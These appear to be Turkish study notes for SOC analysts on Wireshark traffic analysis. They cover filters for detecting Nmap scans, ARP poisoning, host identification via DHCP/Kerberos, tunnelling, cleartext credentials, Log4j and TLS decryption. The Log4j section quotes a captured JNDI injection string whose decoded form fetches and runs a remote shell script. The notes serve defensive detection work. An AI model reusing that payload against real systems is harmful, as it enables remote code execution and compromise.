## 🏗️ 1. Mimari Yapı ve Analiz Metodolojisi

Paket düzeyinde arama yapmaktan ağ trafiğindeki büyük resmi görmeye (korelasyon) geçerken analiz şu 4 ana eksende yürütülür:

  

1. **Keşif ve Tarama Analizi:** Nmap tarama profillerini (TCP Connect, SYN, UDP) TCP bayrakları, pencere boyutu (`window_size`) ve ICMP hata kodları üzerinden ayrıştırmak.
    
      
    
2. **Yerel Ağ / L2-L3 Manipülasyonları:** ARP zehirleme/MITM saldırılarını çiftlenen MAC/IP eşleşmeleri ve yetkisiz gateway anonsları üzerinden izole etmek.
    
      
    
3. **Varlık ve Kimlik Tespiti (Host Profiling):** DHCP, NBNS ve Kerberos gibi kimlik doğrulama/IP dağıtım protokollerini kullanarak IP adreslerini makine adı (`hostname`), kullanıcı adı (`username`) ve MAC adresi ile eşleştirmek.
    
      
    
4. **Gizli Kanallar, Düz Metin ve Şifreli Trafik Analizi:** DNS/ICMP tünelleme, Log4j RCE denemeleri, düz metin kimlik avı ve `SSLKEYLOGFILE` kullanarak TLS trafiğini deşifre etmek.
    
      
    

## 🔍 2. Nmap Tarama Türleri ve TCP Bayrak Analizi

### 🚩 TCP Bayrak Filtreleme Temelleri

|**Bayrak Durumu**|**Sayısal Filtre**|**Mantıksal Filtre**|**SOC Analisti Notu**|
|---|---|---|---|
|**Sadece SYN**|`tcp.flags == 2`|`tcp.flags.syn == 1`|Bağlantı başlatma talebi|
|**Sadece ACK**|`tcp.flags == 16`|`tcp.flags.ack == 1`|Oturum onay paketi|
|**SYN + ACK**|`tcp.flags == 18`|`(tcp.flags.syn == 1) and (tcp.flags.ack == 1)`|Açık porta verilen el sıkışma yanıtı|
|**Sadece RST**|`tcp.flags == 4`|`tcp.flags.reset == 1`|Bağlantı sıfırlama/kapalı port|
|**RST + ACK**|`tcp.flags == 20`|`(tcp.flags.reset == 1) and (tcp.flags.ack == 1)`|Sıfırlama onayı|
|**Sadece FIN**|`tcp.flags == 1`|`tcp.flags.fin == 1`|Bağlantı sonlandırma|

### 🛡️ Tarama Türleri Ayrıştırma Mantığı

#### A. TCP Connect Scan (`nmap -sT`)

- **Mantık:** 3'lü El Sıkışmayı (Three-Way Handshake) **tamamlar** (`SYN -> SYN,ACK -> ACK`). Root yetkisi olmayan kullanıcılar tarafından işletim sistemi soketi üzerinden gerçekleştirilir. Veri alışverişi beklendiği için pencere boyutu genellikle **1024 bayttan büyüktür**.
    
      
    
- **Wireshark Av Filtresi:**
    
      
    

Kod snippet'i

```
tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size > 1024
```

#### B. SYN (Stealth) Scan (`nmap -sS`)

- **Mantık:** 3'lü El Sıkışmayı **tamamlamaz** (`SYN -> SYN,ACK -> RST`). Root/Yönetici yetkisi gerektirir. Veri beklenmediği için pencere boyutu **1024 bayt veya daha küçüktür**.
    
      
    
- **Wireshark Av Filtresi:**
    
      
    

Kod snippet'i

```
tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size <= 1024
```

#### C. UDP Port Scan (`nmap -sU`)

- **Mantık:** UDP bağlantısızdır; açık portlar genellikle yanıt dönmez veya uygulama katmanı yanıtı verirken, kapalı portlar **ICMP Type 3, Code 3 (Destination Unreachable: Port Unreachable)** hatası üretir. Orijinal IP/Port isteği bu ICMP paketinin içine kapsüllenmiştir (encapsulated).
    
      
    
- **Wireshark Av Filtresi:**
    
      
    

Kod snippet'i

```
icmp.type == 3 and icmp.code == 3
```

> [!TIP]
> 
> **Belirli Port Aralığındaki UDP Taramalarını İzleme:**
> 
> Belirli bir port aralığındaki açık portları tespit etmek için `udp.dstport >= 50 and udp.port <= 70` filtresi uygulandıktan sonra dönen ICMP paketlerinin payload'undaki kapsüllenmiş port numaraları analiz edilir.
> 
>   

## 🦹 3. ARP Poisoning ve MITM Analizi

ARP durumsuzdur (stateless), kimlik doğrulama barındırmaz ve yerel ağ segmentinde (L2) çalışır.

  

### 📋 ARP Filtreleri ve Av Metrikleri

|**İşlem / Amaç**|**Filtre / Parametre**|**Açıklama**|
|---|---|---|
|**Global ARP**|`arp`|Tüm ARP trafiğini listeler.|
|**ARP Request**|`arp.opcode == 1`|"Bu IP kimde?" broadcast sorgusu.|
|**ARP Response**|`arp.opcode == 2`|"Bu IP bende" unicast yanıtı.|
|**ARP Scanning**|`arp.dst.hw_mac == 00:00:00:00:00:00`|Hedef MAC bilinmeyen istekler.|
|**Çift IP/MAC Çakışması**|`arp.duplicate-address-detected or arp.duplicate-address-frame`|Aynı IP için farklı MAC anonsları (Zehirlenme göstergesi).|
|**Hedef MAC ARP Flood**|`((arp) && (arp.opcode == 1)) && (arp.src.hw_mac == <MAC>)`|Belirli bir MAC'in ürettiği flood trafiği.|

> [!WARNING]
> 
> **Uzman Uyarısı (Expert Info Sınırı):**
> 
> Wireshark `Expert Info` sekmesi duplicate IP anonslarında yalnızca **ikinci anonsu (çakışmayı tetikleyen)** gösterir. Hangisinin meşru gateway, hangisinin saldırgan olduğunu doğrulamak için ağ topolojisine bakılmalı ve anonsu yapan MAC adresinin diğer aktiviteleri incelenmelidir.
> 
>   

### 🕵️ MITM Trafiği Takip Prosedürü:

1. `arp.duplicate-address-detected` ile aynı IP'yi (`192.168.1.1`) iddia eden MAC adresleri belirlenir.
    
      
    
2. `arp.opcode == 1 and arp.src.hw_mac == 00:0c:29:e2:18:b4` ile saldırganın ağdaki diğer IP'leri taramak için ürettiği sahte ARP istekleri sayılır.
    
      
    
3. Kurban IP adresine ait HTTP trafiğinin hedef MAC adresi olarak saldırganın MAC adresine yönlendirildiği `http and eth.addr == 00:0c:29:e2:18:b4` filtresiyle kanıtlanır.
    
      
    
4. Gönderilen form verilerini ve çalınan kimlik bilgilerini yakalamak için:
    
      
    

Kod snippet'i

```
urlencoded-form matches ".+"
```

## 🏷️ 4. Varlık Tespiti (Host & User Profiling)

IP adreslerini gerçek cihazlar ve kullanıcılarla eşleştirmek için üç ana protokolden yararlanılır:

  

### A. DHCP Analizi

- `dhcp` veya `bootp`
    
      
    

|**DHCP Seçeneği (Option)**|**Filtre Parametresi**|**Analist Çıkarımı**|
|---|---|---|
|**Option 53 (Mesaj Tipi)**|`dhcp.option.dhcp == 3` (Request)<br><br>  <br>  <br><br>`dhcp.option.dhcp == 5` (ACK)<br><br>  <br>  <br><br>`dhcp.option.dhcp == 6` (NAK)|İşlem adımı (Request makine adı taşır; ACK onaydır).|
|**Option 12**|`dhcp.option.hostname contains "keyword"`|Cihazın adı (Hostname).|
|**Option 50**|`dhcp.option.requested_ip_address == <IP>`|Talep edilen IP adresi.|
|**Option 61**|`dhcp.option.client_id`|İstemcinin MAC adresi.|
|**Option 15**|`dhcp.option.domain_name`|Atanan yerel etki alanı adı.|
|**Option 56**|`dhcp.option.message`|Reddedilme gerekçesi (NAK durumunda).|

### B. NetBIOS (NBNS) Analizi

- `nbns`
    
      
    
- **İsim Sorgusu Filtresi:**
    
      
    

Kod snippet'i

```
nbns.name contains "LIVALJM"
```

### C. Kerberos Analizi

- `kerberos`
    
      
    
- `kerberos.pvno == 5` (Protokol Versiyonu)
    
      
    
- `kerberos.realm contains ".org"` (Domain Adı)
    
      
    
- `kerberos.SNameString == "krbtg"` (TGS Bilet Talepleri)
    
      
    

> [!NOTE]
> 
> **Kullanıcı Adı ile Host Adı Ayrımı:**
> 
> `kerberos.CNameString` alanı hem kullanıcıları hem de bilgisayar hesaplarını barındırır.
> 
>   
> 
> - Sonu `$` ile bitenler **Hostname / Makine Hesabıdır** (Örn: `xp1$`).
>     
>       
>     
> - Sonu `$` ile bitmeyenler **Kullanıcı Hesabıdır** (Örn: `u5`).
>     
>       
>     
> - **Yalnızca kullanıcı adlarını listeleme filtresi:**
>     
>       
>     
> 
> Kod snippet'i
> 
> ```
> kerberos.CNameString and !(kerberos.CNameString contains "$")
> ```

## 🚇 5. Tünelleme Analizi (ICMP & DNS Tunnelling)

Saldırganlar kurumsal ağ filtrelerini aşmak ve C2 (Komuta Kontrol) irtibatı kurmak için meşru protokollere veri gömerler.

  

### A. ICMP Tünelleme

- Standart bir ping paketi 64 bayttır. 64 bayt üzeri veri payload'u taşıyan ICMP paketleri veri sızdırma (exfiltration) veya tünelleme göstergesidir.
    
      
    
- **Av Filtresi:**
    
      
    

Kod snippet'i

```
(data.len > 64) and (icmp contains "ssh" or icmp contains "ftp" or icmp contains "tcp" or icmp contains "http")
```

### B. DNS Tünelleme

- C2 sunucusu yetkili DNS sunucusu (Authoritative NS) olarak yapılandırılır; veriler subdomain alanına Base64/Hex formatında şifrelenerek (`<encoded-payload>.maliciousdomain.com`) sorgulanır.
    
      
    
- **Av Filtresi (Anormal Uzunluktaki DNS Sorguları):**
    
      
    

Kod snippet'i

```
dns.qry.name.len > 40 and !mdns
```

## 🔓 6. Düz Metin Protokol Analizi (FTP, HTTP & Log4j)

### A. FTP Analizi

|**Yanıt Kodu / Komut**|**Filtre**|**Açıklama**|
|---|---|---|
|**213 File Status**|`ftp.response.code == 213`|İndirilen/erişilen dosyanın boyutu (bayt cinsinden `arg` içinde döner).|
|**227 Passive Mode**|`ftp.response.code == 227`|Pasif bağlantı durumu.|
|**230 Login OK**|`ftp.response.code == 230`|Başarılı giriş.|
|**530 Login Fail**|`ftp.response.code == 530`|Başarısız giriş (Brute-Force avı için kullanılır).|
|**USER / PASS**|`ftp.request.command == "USER"`<br><br>  <br>  <br><br>`ftp.request.command == "PASS"`|Gönderilen kullanıcı adı ve parola.|
|**RETR / STOR**|`ftp.request.command == "RETR"`<br><br>  <br>  <br><br>`ftp.request.command == "STOR"`|RETR: Sunucudan indirme / STOR: Sunucuya yükleme.|

### B. HTTP ve User-Agent Tehdit Avcılığı

|**HTTP Analiz Alanı**|**Wireshark Filtresi**|**Tehdit Avı Kullanımı**|
|---|---|---|
|**İstek Metotları**|`http.request.method == "POST"`|Kimlik gönderme veya exploit payload yüklemeleri.|
|**Durum Kodları**|`http.response.code == 401 / 403 / 404 / 500`|Web saldırısı tarama yanıtları.|
|**Tarama Araçları**|`http.user_agent contains "sqlmap" or http.user_agent contains "Nmap" or http.user_agent contains "Nikto" or http.user_agent contains "Wfuzz"`|Otomatize güvenlik aracı izleri.|
|**Yazım Hataları (Typo)**|Manuel analiz (Örn: `Mozlilla` vs `Mozilla`)|Sahte istemci tespiti.|

### C. Log4j (CVE-2021-44228) Analizi

- Log4j saldırıları genellikle `POST` veya `GET` isteklerinin başlıklarına (`User-Agent`, `X-Forwarded-For` vb.) JNDI enjeksiyon dizgisi eklenerek başlatılır.
    
      
    
- **Av Filtreleri:**
    
      
    

Kod snippet'i

```
(ip contains "jndi") or (ip contains "Exploit")
(http.user_agent contains "$") or (http.user_agent contains "==")
```

- **Payload Çözümleme Örneği:**
    
      
    - Yakalanan User-Agent: `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}`
        
          
        
    - Base64 Çözümü (CyberChef): `wget [http://62.210.130.250/lh.sh;chmod](http://62.210.130.250/lh.sh;chmod) +x lh.sh;./lh.sh` (Hedef zararlı IP: `62.210.130.250`).
        
          
        

## 🔐 7. Şifreli Trafiğin Deşifre Edilmesi (HTTPS / TLS Decryption)

HTTPS, oturumu TLS ile şifreler. Trafiği görebilmek için tarayıcı tarafından oturum esnasında üretilen anahtar log dosyasına (`SSLKEYLOGFILE`) ihtiyaç duyulur.

  

### TLS El Sıkışma Filtreleri:

- **Client Hello:** `(http.request or tls.handshake.type == 1) and !(ssdp)`
    
      
    
- **Server Hello:** `(http.request or tls.handshake.type == 2) and !(ssdp)`
    
      
    

### Wireshark'a Key Log Ekleme Adımları:

1. **Menü Yolu:** `Edit` ➡️ `Preferences` ➡️ `Protocols` ➡️ `TLS`
    
      
    
2. **(Pre)-Master-Secret log filename** alanına `KeysLogFile.txt` dosyasını göster.
    
      
    
3. Trafik anında çözülür; `http2` filtresi ile HTTP/2 çerçeveleri, `File -> Export Objects -> HTTP` ile oturum içerisinden aktarılan dosyalar incelenebilir.
    
      
    

## 🎁 8. Bonus Özellikler: Credentials & Firewall ACL Rules

### 🔑 Cleartext Credentials Avcısı

- **Konum:** `Tools` ➡️ `Credentials` (Wireshark v3.1+).
    
      
    
- **Desteklenen Protokoller:** FTP, HTTP (Basic Auth), IMAP, POP, SMTP.
    
      
    
- **Analiz Kolaylığı:** Yakalanan tüm kullanıcı adı ve parolaları tek pencerede listeler; tıklandığında ilgili pakete yönlendirir.
    
      
    

### 🛡️ Firewall ACL Kural Üretici

- **Konum:** `Tools` ➡️ `Firewall ACL Rules`.
    
      
    
- **Desteklenen Güvenlik Duvarları:** Netfilter (iptables), Cisco IOS, IPFilter, IPFirewall (ipfw), Packet Filter (pf), Windows Firewall (netsh).
    
      
    
- **Örnek Çıktılar:**
    
      
    - Kaynak IP Engelleme (ipfw): `add deny ip from 10.121.70.151 to any in`
        
          
        
    - Hedef MAC İzin Verme (ipfw): `add allow MAC 00:d0:59:aa:af:80 any in`

## 🚦 Tekrar Kategorisi ve Stratejisi

- **Sınıflandırma:** 🔴 **Kırmızı Sınıf (Pratik / Filtre / Komut Hatırlaması)**
    
      
    
    _Bu oda salt kavramsal değil; SOC analizinde doğrudan hayat kurtaran özel Wireshark filtre sözdizimleri (`window_size`, `arp.opcode`, `kerberos.CNameString`, `data.len`, `tcp.flags`) ve deşifreleme adımları barındırmaktadır._
    
      
    

### ⏱️ Pazar Günü 3 Dakikalık Hızlı Tekrar Rutini:

1. **00:00 - 01:00 (Tarama Ayırımı):** `SYN` vs `Connect` tarama filtresini zihninde yaz (`window_size > 1024` = Connect, `<= 1024` = SYN). Kapalı UDP'nin `icmp.type == 3 and icmp.code == 3` ürettiğini hatırla.
    
      
    
2. **01:00 - 02:00 (Host Profiling & Kerberos):** DHCP Option 53'ün (3=Request, 5=ACK), Kerberos'ta `$` ile bitenin makine adı, bitmeyenin kullanıcı adı olduğunu tekrar et.
    
      
    
3. **02:00 - 03:00 (Tünelleme & Log4j):** Anormal ICMP boyutu filtresini (`data.len > 64 and icmp`) ve Log4j için `ip contains "jndi"` mantığını gözden geçir.
